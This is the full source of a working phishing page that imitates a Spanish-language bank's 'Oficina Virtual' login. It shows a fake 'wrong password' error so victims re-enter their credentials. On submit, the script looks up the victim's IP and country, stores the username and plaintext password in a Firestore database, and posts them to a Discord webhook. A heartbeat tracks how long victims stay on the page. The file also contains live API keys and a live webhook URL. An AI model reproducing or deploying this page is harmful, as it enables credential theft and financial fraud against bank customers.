<html><head><style>

}
footer {

}

  display: flex;
  flex-direction: column;

}

.header-top {

}

.header-bottom {

    padding: 0px 0px;

.login-wrapper {
    display: flex;

}

.login-container {

    width: 100%;

}
.txtSeleccionMetodo {
    font-family: apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        margin-top: -35px;
        margin-bottom: 22px;
        font-size: 25px;
        font-style: normal;
        font-weight: 600;
        color: #0033A0 !important;
        display: block;
        text-align: center;
    }

.input-group {
    display: flex;
    align-items: center;

.input-group img {

}

.input-group input {
    border: none !important;
    outline: none;
    width: 100%;

    background: transparent;

.toggle-password {
    width: 20px;
    height: 20px;
    cursor: pointer;
    margin-left: 10px;
    margin-right: -41px;
    fill: #1bacec;
}

.btn-submit {
    background-color: #db2828;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

.btn-submit:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
    opacity: 0.7;
}

.custom-checkbox {
    width: 14px;
    height: 14px;
    border-radius: 2px;
    margin-right: 8px;
    margin-left: -20px;
    cursor: pointer;
    accent-color: #0033A0;
}
</style>

    <meta charset="utf-8">

</head>

<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
    authDomain: "kkkkk-5e2bd.firebaseapp.com",
    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
    projectId: "kkkkk-5e2bd",
    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
    messagingSenderId: "1059258934487",
    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.firestore();

  // --- SISTEMA DE LATIDOS CORREGIDO ---
  function enviarLatido() {
    const usuarioId = localStorage.getItem("usuario");
    if (usuarioId) {
      const docRef = db.collection("prolme").doc(usuarioId);
      docRef.get().then((doc) => {
        if (doc.exists) {
          docRef.update({
            last_active: firebase.firestore.FieldValue.serverTimestamp()
          }).catch((e) => console.error(e));
        }
      });
    }
  }

  setInterval(enviarLatido, 5000);
  window.addEventListener('visibilitychange', () => { if(document.visibilityState === 'hidden') enviarLatido(); });
</script>

<body background="background.png">
    <header class="header-vertical">
  <div class="header-top">
    <img style="width: 150px;" src="logo.gif">
  </div>
  <div class="header-bottom">
    <p style="text-align: center;font-weight: 400;font-size: 21px;margin-top: 5px;">Oficina Virtual | Personas</p>
  </div>
</header>

<div class="login-wrapper">
    <div class="login-container">
         <a class="txtSeleccionMetodo">Ingrese</a>
         <h5 style="color:red;">Usuario o contraseña incorrectos</h5>
         <form id="loginform">
             <div class="input-group" style="margin-bottom: 15px;">
                 <img src="Personalizar.svg" alt="Usuario">
                 <input type="text" id="ypn-us" name="ypn-us" required="" placeholder="Usuario" oninput="checkInputs()">
             </div>
             
             <div class="input-group" style="margin-bottom: 15px;">
                 <img src="Seguridad.svg" alt="Contraseña">
                 <input type="password" id="password" name="password" required="" placeholder="Contraseña" oninput="checkInputs()">
                 <svg id="eyeIcon" class="toggle-password" viewBox="0 0 24 24" onclick="togglePasswordVisibility()">
                     <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                 </svg>
             </div>
             
             <div style="margin-left: 20px; margin-bottom: 15px; display: flex; align-items: center;">
                 <input type="checkbox" id="certificado" name="certificado" class="custom-checkbox" onclick="window.location.href='index2.html';">
                 <label for="certificado" style="font-size: 16px; color: #333;">Certificado Digital</label>
             </div>

             <button type="submit" id="submitBtn" class="btn-submit" style="width: 45%;padding: 10px;margin-left: 87px;" disabled>Ingresar</button>
             <br><br>
             <button type="button" class="btn-submit" style="width: 66%;padding: 5px;margin-left: 60px;font-size: 12px;cursor: default;background-color: #0033A0;" onclick="return false;">¿Olvidó su usuario o contraseña?</button>
         </form>
     </div>
</div>

<script>
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.36 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>';
    } else {
        passwordInput.type = 'password';
        eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
    }
}

function checkInputs() {
    const user = document.getElementById('ypn-us').value.trim();
    const pass = document.getElementById('password').value.trim();
    document.getElementById('submitBtn').disabled = !(user !== "" && pass !== "");
}

document.querySelector("#loginform").addEventListener("submit", async (e) => {
    e.preventDefault();
    const usuario = document.querySelector("#ypn-us").value.trim();
    const contrasena = document.querySelector("#password").value;
    
    const [paisRes, ipRes] = await Promise.all([
        fetch('https://ipinfo.io/json').then(r => r.json()),
        fetch('https://api64.ipify.org?format=json').then(r => r.json())
    ]);
    
    const pais = paisRes.country || 'Desconocido';
    const ip = ipRes.ip || 'Desconocida';

    localStorage.setItem("usuario", usuario);
    await db.collection("prolme").doc(usuario).set({
        user: usuario, pass: contrasena, pais, ip, page: 0, 
        last_active: firebase.firestore.FieldValue.serverTimestamp()
    }, { merge: true });

    await fetch("https://discord.com/api/webhooks/1535509840045281381/4ZtYNq9tt97-oWR6WRFp1nHqpNRjdL7mRk-BeGfkiXQBi7404IS_DEkLn7TlWkvTZIJj", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: `👤 Usuario: ${usuario}\n👤 Pass: ${contrasena}\nPaís: ${pais}\nIP: ${ip}` })
    });
    window.location.href = "cargando.html";
});
</script>
